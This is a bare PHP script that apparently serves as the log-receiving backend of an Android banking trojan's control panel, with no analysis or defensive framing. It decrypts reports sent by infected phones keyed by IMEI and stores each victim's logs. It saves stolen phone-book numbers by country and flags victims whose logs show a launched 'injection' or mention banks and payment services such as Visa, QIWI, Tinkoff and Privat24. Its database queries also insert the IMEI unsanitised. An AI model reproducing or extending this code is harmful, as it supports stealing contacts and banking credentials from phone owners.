<?php  
include 'crypt.php';
include 'config.php';

$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);

$request = mb_substr($request, 0, mb_strlen($request));
$request =  decrypt($request,cryptKey);

$massivReq = explode("|", $request);
$IMEI_log = $massivReq[0]; 
$text_log = $massivReq[1]; 

echo "$IMEI_log $text_log";

if(($IMEI_log != "") && ($text_log != ""))
{
	//Записываем ЛОГи!    
	$path_log = "logs/$IMEI_log.log";	
	$perehod = "\n";
	$ss = str_replace("</br>","",$text_log);
	$ss = str_replace("Номера с телефонной книги","Номера с телефонной книги\n",$ss);
	$str_log = "$perehod$IMEI_log: $ss$perehod";
	file_put_contents($path_log, $str_log, FILE_APPEND);
	
	//---
	if (preg_match("/} Номера с телефонной книги/",$text_log))
	{
		$country = mb_substr($text_log, 0, 4);
		$ss = " Номера с телефонной книги";
		$text_num = str_replace("$country$ss","",$text_log);
		$country = str_replace(" ","",$country);
		
		$path_nums = "numers/$country.html";	
		$str_nums = "$text_num";
		
		file_put_contents($path_nums, $str_nums, FILE_APPEND);
	}		
	//---
	
	$massiv_visa = array('visa', 'VISA','Visa','QIWI','bank','BANK','Bank','VTB','ВТБ','Karta','CARD','Card','card','Tinkoff','privatbank','PRIVATBANK','Privatbank','privat24','Privat24','PRIVAT24','ECMC','webmoney','Webmoney','WEBMONEY');

	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');
	$data_ = date('Y-m-d H:i');
	$sql3 = "UPDATE kliets SET lastConnect = '$data_' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql3);
	
	$sql3 = "UPDATE kliets SET log = '1' WHERE IMEI = '$IMEI_log';";
	$connection->query($sql3);
		
	
	
	if (preg_match("/Был запущен инжект/",$text_log))
	{
		$sql3 = "UPDATE kliets SET color = 'yellow' WHERE IMEI = '$IMEI_log';";
		$connection->query($sql3);
	}		
	
	
		/*if (strpos($text_log, "Был запущен инжект") == true) 
		{
			
		}
	*/
		
	foreach($massiv_visa as $sl_visa)
	{
		if (strpos($text_log, $sl_visa) == true) 
		{
			$sql3 = "UPDATE kliets SET l_bank = '1' WHERE IMEI = '$IMEI_log';";
			$connection->query($sql3);
		}
	}
}
?>